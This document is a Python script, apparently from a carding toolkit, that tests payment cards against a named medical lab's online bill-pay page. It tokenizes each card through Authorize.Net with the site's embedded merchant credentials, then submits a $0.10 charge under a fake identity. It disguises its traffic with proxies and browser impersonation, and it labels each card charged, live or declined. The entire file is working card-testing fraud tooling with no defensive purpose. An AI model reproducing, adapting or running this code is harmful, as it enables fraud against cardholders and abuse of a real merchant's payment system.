"""
Authorize.Net Accept.js Gate Module (/an)
Target: https://avanticmedicallab.com/pay-bill-online/
Direct Accept.js Tokenization & Settlement Pipeline ($0.10).
"""
import re
import json
import uuid
import random
import string
import asyncio
from curl_cffi.requests import AsyncSession

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    formatted = None
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        formatted = ps
    else:
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
        else: formatted = f"http://{ps}"

    return formatted

async def check_card_authorize(
    cc: str,
    mm: str,
    yy: str,
    cvc: str,
    proxy_url: str | None = None
) -> tuple[str, str, str]:
    """
    Checks a single card against Authorize.Net Accept.js pipeline.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 4:
        yy_short = yy[2:]
    else:
        yy_short = yy
    cvc = str(cvc).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)
    email = _generate_email()
    first_name = "Alex"
    last_name = "Morgan"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

    try:
        kw = {"impersonate": "chrome124", "timeout": 25}
        if formatted_proxy:
            kw["proxy"] = formatted_proxy

        async with AsyncSession(**kw) as session:
            # Step 1: GET page to fetch dynamic WPForms Token
            r_page = await session.get(
                'https://avanticmedicallab.com/pay-bill-online/',
                headers={'User-Agent': user_agent}
            )
            if r_page.status_code != 200:
                return "declined", f"Failed to load gateway page ({r_page.status_code})", brand

            token_match = re.search(r'name="wpforms\[token\]"\s*value="([^"]+)"', r_page.text)
            wp_token = token_match.group(1) if token_match else 'ccf1f214e6ae1c99c9bf26c60650bd7f'

            # Step 2: Tokenize card via Authorize.Net Accept.js API
            api_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': 'https://avanticmedicallab.com',
                'Referer': 'https://avanticmedicallab.com/',
                'User-Agent': user_agent
            }

            tok_data = {
                'securePaymentContainerRequest': {
                    'merchantAuthentication': {
                        'name': '3c5Q9QdJW',
                        'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
                    },
                    'data': {
                        'type': 'TOKEN',
                        'id': str(uuid.uuid4()),
                        'token': {
                            'cardNumber': cc,
                            'expirationDate': f"{mm}{yy_short}",
                            'cardCode': cvc,
                            'fullName': f"{first_name} {last_name}"
                        },
                    },
                },
            }

            r_tok = await session.post(
                'https://api2.authorize.net/xml/v1/request.api',
                headers=api_headers,
                json=tok_data
            )
            tok_clean = r_tok.content.decode('utf-8-sig', errors='ignore')
            try:
                tok_json = json.loads(tok_clean)
            except Exception:
                tok_json = {}

            if 'opaqueData' not in tok_json:
                messages = tok_json.get('messages', {}).get('message', [{}])
                err_msg = messages[0].get('text', 'Tokenization Failed') if isinstance(messages, list) and len(messages) > 0 else 'Tokenization Failed'
                err_upper = str(err_msg).upper()
                if "INVALID CARD" in err_upper or "E_WC_05" in err_upper:
                    return "declined", "Invalid Card Number", brand
                elif "EXPIRATION" in err_upper or "E_WC_06" in err_upper or "E_WC_07" in err_upper:
                    return "declined", "Invalid Expiration Date", brand
                elif "CARD CODE" in err_upper or "CVC" in err_upper or "CVV" in err_upper or "E_WC_08" in err_upper:
                    return "declined", "Invalid Security Code", brand
                return "declined", f"Declined - {err_msg}", brand

            opaque_descriptor = tok_json['opaqueData'].get('dataDescriptor', 'COMMON.ACCEPT.INAPP.PAYMENT')
            opaque_value = tok_json['opaqueData'].get('dataValue')

            # Step 3: Submit checkout via WPForms AJAX
            ajax_headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://avanticmedicallab.com',
                'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
                'User-Agent': user_agent,
                'X-Requested-With': 'XMLHttpRequest',
            }

            form_fields = {
                'wpforms[fields][1][first]': first_name,
                'wpforms[fields][1][last]': last_name,
                'wpforms[fields][17]': '0.10',
                'wpforms[fields][2]': email,
                'wpforms[fields][3]': '(315) 424-8967',
                'wpforms[fields][14]': '',
                'wpforms[fields][4][address1]': '100 Main St',
                'wpforms[fields][4][city]': 'New York',
                'wpforms[fields][4][state]': 'NY',
                'wpforms[fields][4][postal]': '10001',
                'wpforms[fields][6]': '$ 0.10',
                'wpforms[fields][11][]': 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.',
                'wpforms[id]': '4449',
                'wpforms[author]': '1',
                'wpforms[post_id]': '3388',
                'wpforms[authorize_net][opaque_data][descriptor]': opaque_descriptor,
                'wpforms[authorize_net][opaque_data][value]': opaque_value,
                'wpforms[authorize_net][card_data][expire]': f"{mm}/{yy_short}",
                'wpforms[token]': wp_token,
                'action': 'wpforms_submit',
                'page_url': 'https://avanticmedicallab.com/pay-bill-online/',
                'page_title': 'Pay Bill Online',
                'page_id': '3388',
            }

            r_sub = await session.post(
                'https://avanticmedicallab.com/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=form_fields
            )
            res_text = r_sub.text

            try:
                res_json = r_sub.json()
                if res_json.get('success'):
                    return "charged", "Charge Successful ($0.10)", brand
                else:
                    data_err = res_json.get('data', {})
                    err_str = str(data_err)
                    if isinstance(data_err, dict) and 'errors' in data_err:
                        err_str = str(data_err['errors'])
                    
                    err_lower = err_str.lower()
                    if "insufficient" in err_lower or "funds" in err_lower:
                        return "live", "Insufficient Funds", brand
                    elif "cvv" in err_lower or "cvc" in err_lower or "card code" in err_lower or "security code" in err_lower:
                        return "live", "Incorrect CVV (Live CCN)", brand
                    elif "avs" in err_lower or "address" in err_lower or "zip" in err_lower:
                        return "live", "AVS Mismatch (Card Live)", brand
                    elif "verification" in err_lower or "3d" in err_lower or "authenticate" in err_lower:
                        return "3ds", "3D Secure / Verification Required", brand
                    elif "expired" in err_lower:
                        return "declined", "Card Expired", brand
                    elif "do not honor" in err_lower or "declined" in err_lower:
                        return "declined", "Card Declined by Issuer", brand
                    else:
                        clean_err = re.sub(r'<[^>]+>', '', err_str).strip()
                        clean_err = re.sub(r'\s+', ' ', clean_err)
                        return "declined", clean_err[:100] if clean_err else "Card Declined", brand
            except Exception:
                err_lower = res_text.lower()
                if "thank you" in err_lower or "success" in err_lower or "order-received" in err_lower:
                    return "charged", "Charge Successful ($0.10)", brand
                elif "insufficient" in err_lower:
                    return "live", "Insufficient Funds", brand
                elif "verification" in err_lower or "3d" in err_lower:
                    return "3ds", "3D Secure / Verification Required", brand
                else:
                    return "declined", "Card Declined", brand

    except asyncio.TimeoutError:
        return "error", "Connection timed out", "N/A"
    except Exception as e:
        err_str = str(e)
        if "502" in err_str or "Bad Gateway" in err_str or "ProxyError" in err_str or "ConnectError" in err_str:
            return "error", "Proxy connection failed (Dead or invalid proxy)", "N/A"
        return "error", f"Error: {err_str[:60]}", "N/A"

